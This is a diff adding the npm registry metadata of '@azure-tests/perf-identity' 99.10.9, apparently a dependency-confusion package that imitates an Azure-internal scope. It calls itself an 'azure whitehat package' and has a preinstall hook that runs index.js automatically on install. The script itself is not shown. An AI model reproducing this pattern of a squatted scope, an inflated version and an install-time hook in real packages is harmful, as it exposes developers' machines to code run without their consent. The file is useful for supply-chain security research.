@@ -1,0 +1,39 @@
+{
+    "name": "@azure-tests/perf-identity",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "@azure-tests/perf-identity@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-7eQ5UZFbXqCZCgLTDyKskuvQyUJjqQiNW3KgVVEqlYz++bvOkVXfnC7tVf5tSGQCXswiijYFMOJ6MmnciJmz0w==",
+        "shasum": "dab5c01a6aae37e5394879179f709dce8ca9fcfa",
+        "tarball": "https://registry.npmjs.org/@azure-tests/perf-identity/-/perf-identity-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3590,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRYyCRA9TVsSAnZWagAAyi4P/2UWtQhcrPntozjT1lVd\nrKMtSum95y1fjTA0vcEi92Nu6mJuSh0pKe6pxClieuF/0GormK1XPGYY5Ayu\n87ToiN/+TOYlEwhP9MS2VxNviJZ7VI6Ec7dmuF/nT6grvPQz90u05XTZknC6\ndu1kMjcRvQlk/codHJ2XtLFaaZsjXpRIa6vcoZ5RU6VcozyEASLq7LszweZ/\n4VMtA4OCma8vx5DYND1EPT9HADgpQtlC0vysFs4IzHMRzZBY/DThVps1cAAo\nvBAtnERVfjH0UCnsuKy1dMBWhCavie/cH5K8rD6KespBQzoCx4PfLzCAr44w\nrEmejJHZZ28z8pZVctysKz5MAmZYjJzjz4Zk5k7OAnMu0MYtUcvstW8eUGup\n7aaSjH11SSum9n012/yPELm3wLUDsy6EnFn1HJUebRKXBTquctKGBgMCS+aA\n6qGuBDXRCKsv9UrwxateidR0x7/XGu+J6VMZCsnLaNDtOF2zNcsJQOucBQ2v\nD5u61yoTe4d1hcnVXlw3IhuPZaa5qNetvpdRAjQ/POwGVyrm3LBX2EnQl5Ue\n+GefnNgjjTeNYxq2C6RVrbHX7ujXnGcMWcvi1N3pS+QWpXgRLXGe1yVPsVcf\nlUA5ZcBh21TjYinGwGQuCCGjpvPJOMG+l9Xqe3XP6Mee8SyNeNzbfpb7eAKO\neZmx\r\n=az5u\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-identity_99.10.9_1637946929958_0.30097797383335534"
+    },
+    "_hasShrinkwrap": false
+}
